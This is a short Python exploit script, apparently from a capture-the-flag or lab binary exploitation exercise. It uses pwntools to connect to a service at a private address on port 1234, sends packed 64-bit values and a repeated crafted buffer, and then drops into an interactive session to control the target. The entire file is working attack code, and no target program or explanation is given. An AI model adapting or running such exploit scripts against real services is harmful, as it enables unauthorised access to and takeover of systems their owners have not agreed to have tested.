from pwn import *
s = remote('192.168.0.85',1234)
raw_input()
s.send(p64(0x3))
s.send(p64(0x3))
dat1 = p64(0x4)
dat1 += p64(0x0)
dat1 += p64(0)*8
s.send(dat1*6)
s.interactive()
